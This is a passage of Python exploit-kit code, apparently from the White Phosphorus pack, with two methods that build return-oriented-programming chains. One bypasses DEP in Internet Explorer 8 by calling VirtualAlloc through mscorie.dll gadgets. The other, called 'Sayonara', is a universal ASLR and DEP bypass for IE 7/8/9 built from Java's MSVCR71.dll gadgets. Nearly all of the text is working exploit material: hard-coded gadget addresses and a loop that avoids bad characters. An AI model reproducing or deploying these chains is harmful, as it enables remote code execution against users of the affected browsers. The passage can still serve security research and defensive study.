        self.log("WP> Building IE8 mscorie.dll DEP bypass using VirtualAlloc")
        depBypass =""
        depBypass += pack('<L', 0x63f05428)  # POP EDI, ESI, RET
        depBypass += pack('<L', 0x63f05b01)  # RETN
        depBypass += pack('<L', 0x63f05b01)  # RETN
        depBypass += pack('<L', 0x63f05557)  # POP EBP
        depBypass += pack('<L', 0x63f04cb5)  # Call VirtualAlloc 
        depBypass += pack('<L', 0x63f054c0)  # POP EBX
        depBypass += pack('<L', size)  # Size (was 7d0)
        depBypass += pack('<L', 0x63F01C97)  # OR EAX,80070000 (Clear the zero flag)
        depBypass += pack('<L', 0x63f05458)  # POP EDX
        depBypass += pack('<L', 0x00001000)  # Type
        depBypass += pack('<L', 0x63f01e13)  # POP ECX
        depBypass += pack('<L', 0x00000040)  # Protect
        depBypass += pack('<L', 0x63f05afa)  # PUSHAD, XOR EAX,C9027563, RET
        depBypass += pack('<L', 0x63f069e3)  # CALL ESP
        depBypass += pack('<L', 0x11111111)  # slackspace
        depBypass += pack('<L', 0x11111111)  # slackspace
        depBypass += pack('<L', 0x11111111)  # slackspace
        depBypass += pack('<L', 0x11111111)  # slackspace
        depBypass += pack('<L', 0x11111111)  # slackspace
        self.depBypass_size = len(depBypass)
        self.log("WP> IE8 mscorie.dll DEP Bypass Size: %d Bytes" % self.depBypass_size) 
        return depBypass
    
######################################################################################


    def wp_sayonaraASLRDEPBypass(self,size=2200):
        # White Phosphorus
        # Universal ASLR + DEP Bypass for IE 7/8/9 on Windows 2003/XP/7/Vista
        #
        # Uses C:\Program Files\Java\jre6\bin\MSVCR71.dll which is loaded by
        # default by the jre-6u24-windows-i586-s.exe (windows 7, XP offline)
        # JRE install.

        self.log("WP> Building Sayonara - Universal ASLR and DEP bypass")
        
        size += 4  # bytes to shellcode after pushad esp ptr
        
        depBypass = pack('<L', 0x7C344CC1)  # pop eax
        depBypass += pack('<L', 0x7C3410C2) # pop ecx
        depBypass += pack('<L', 0x7C342462) # xor ebx, ebx; call eax
        depBypass += pack('<L', 0x7C38C510) # rw
        depBypass += pack('<L', 0x7C365645) # pop esi
        depBypass += pack('<L', 0x7C345243) # ret
        depBypass += pack('<L', 0x7C348F46) # pop ebp
        depBypass += pack('<L', 0x7C3487EC) # call eax; pop ecx
        depBypass += pack('<L', 0x7C344CC1) # pop eax
        
        # increment size to avoid bad chars
        while hasbadchar((pack("<i", -size)), self.badstring):
            size += 1
        
        depBypass += pack("<i", -size)
        depBypass += pack('<L', 0x7C34D749) # neg eax
        depBypass += pack('<L', 0x7C3458AA) # add ebx, eax
        depBypass += pack('<L', 0x7C3439FA) # pop edx
        depBypass += pack('<L', 0xFFFFFFC0)
        depBypass += pack('<L', 0x7C351EB1) # neg edx
        depBypass += pack('<L', 0x7C354648) # pop edi
        depBypass += pack('<L', 0x7C3530EA) # mov eax, [eax]
        depBypass += pack('<L', 0x7C344CC1) # pop eax
        depBypass += pack('<L', 0x7C37A181) # (VP + 30) - 0EF
        depBypass += pack('<L', 0x7C355AEB) # sub eax, 30
        depBypass += pack('<L', 0x7C378C81) # pushad
        depBypass += pack('<L', 0x7C36683F) # push esp
        self.depBypass_size = len(depBypass)
        self.log("WP> Universal Bypass Size: %d bytes"%self.depBypass_size)
        return depBypass
